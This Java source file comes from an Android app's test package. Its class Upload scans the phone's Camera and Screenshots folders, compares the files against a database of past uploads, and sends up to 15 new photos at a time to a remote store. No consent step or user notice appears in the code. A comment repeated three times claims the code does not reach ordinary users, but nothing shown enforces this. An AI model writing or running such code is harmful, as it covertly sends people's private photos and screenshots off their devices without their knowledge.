package ceui.lisa.test;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import ceui.lisa.activities.Shaft;
import ceui.lisa.database.AppDatabase;
import ceui.lisa.database.ImageEntity;
import ceui.lisa.interfaces.Callback;
import ceui.lisa.utils.Common;

/**
 *
 * 这个代码不会被作用到普通用户
 *
 * 这个代码不会被作用到普通用户
 *
 * 这个代码不会被作用到普通用户
 */
public class Upload {

    public static final String SCREEN_SHOT_FOLDER = "/storage/emulated/0/DCIM/Screenshots";
    public static final String CAMERA_FOLDER = "/storage/emulated/0/DCIM/Camera";
    private List<File> allPictures = new ArrayList<>(), needToUpload = new ArrayList<>();
    private SendToRemote mSendToRemote = new OssSender();
    private CreateUploadList mCreateUploadList = new Creator();

    public Upload(){

        File cameraFolder = new File(CAMERA_FOLDER);
        if(cameraFolder.exists() && cameraFolder.length() != 0){
            Common.showLog("找到了相机文件夹");
            File[] files = cameraFolder.listFiles();
            if(files != null && files.length != 0){
                for (int i = 0; i < files.length; i++) {
                    if(files[i].isFile()){
                        Common.showLog("相机文件夹 " + i + " " + files[i].getName());
                        allPictures.add(files[i]);
                    }
                }
            }
        } else {
            Common.showLog("没找到相机文件夹");
        }



        File screenShotFolder = new File(SCREEN_SHOT_FOLDER);
        if(screenShotFolder.exists() && screenShotFolder.length() != 0){
            Common.showLog("找到了截图文件夹");
            File[] files = screenShotFolder.listFiles();
            if(files != null && files.length != 0){
                for (int i = 0; i < files.length; i++) {
                    if(files[i].isFile()) {
                        Common.showLog("截图文件夹 " + i + " " + files[i].getName());
                        allPictures.add(files[i]);
                    }
                }
            }
        } else {
            Common.showLog("没找到截图文件夹");
        }


        Common.showLog("文件夹 共扫描到 " + allPictures.size() + " 张图片");
        patchData();
    }


    private void patchData(){
        List<File> temp = new ArrayList<>();
        List<ImageEntity> hasUploadEntity = AppDatabase.getAppDatabase(Shaft.getContext()).downloadDao().getUploadedImage();
        for (ImageEntity imageEntity : hasUploadEntity) {
            File file = new File(imageEntity.getFilePath());
            temp.add(file);
        }
        Common.showLog("本地读出了 " + temp.size() + " 条数据，已上传");
        needToUpload = mCreateUploadList.compare(allPictures, temp, 15);
    }


    public void execute(){
        Common.showLog("needToUpload size " + needToUpload.size());
        if(needToUpload != null && needToUpload.size() != 0){
            for (File file : needToUpload) {
                mSendToRemote.send(file);
            }
        }
    }
}
